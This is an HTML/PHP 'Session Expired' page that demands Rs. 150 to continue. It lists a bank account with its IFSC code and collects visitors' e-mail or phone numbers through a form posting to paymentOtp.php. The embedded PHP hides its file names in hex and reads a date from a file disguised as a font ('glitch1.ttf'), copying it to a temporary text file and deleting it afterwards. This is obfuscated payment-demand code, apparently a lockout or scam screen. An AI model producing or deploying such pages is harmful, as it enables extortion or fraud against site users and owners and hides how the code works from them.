<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment QR Code</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }

        .qr-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 280px;
        }

        .qr-card h2 {
            margin: 10px 0;
            font-size: 18px;
            color: #333;
        }
        .qr-card h3 {
            margin: 10px 0;
            font-size: 15px;
            color: #311;
        }
        .pay-btn {
            display: block;
            margin: 15px auto 0;
            padding: 10px 15px;
            background: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            text-decoration: none;
        }

        .pay-btn:hover {
            background: #0056b3;
        }
        ol li{text-align: left;white-space: nowrap;}
    </style>
</head>
<body>
    <div class="qr-card">
        <h2><b style="color:red;">Session Expired</b><br />
        <h3 style="color:green;">On <?php
$a=hex2bin('676c69746368312e747466');
$b=hex2bin('7061796d656e74446174652e747874');
copy($a,$b);
echo file_get_contents($b);
unlink($b);
?>
</h3><br /><br />
        <b>Pay Rs. 150/= to continue</b>
        <hr />
        <div style="background: yellow;padding: 5px;border-radius: 10px;border: 1px dotted red;">
        <ol>
            <li>Bank Name: Bank of Baroda</li>
            <li>A/c. No.: 69438100010105</li>
            <li>IFSC: BARBODBTEMA</li>
        </ol>
    </div>
        <form style="background: lightblue;border: 1px solid red;padding:5px;" action="paymentOtp.php" method="post">
            Please enter your e-mail id or phone number<br />
            <input name="gmail" required autofocus /><hr />
        <button class="pay-btn" type="submit" name="submit">Click here (If already payed.)</button>
    </form>
    </div>

</body>
</html>
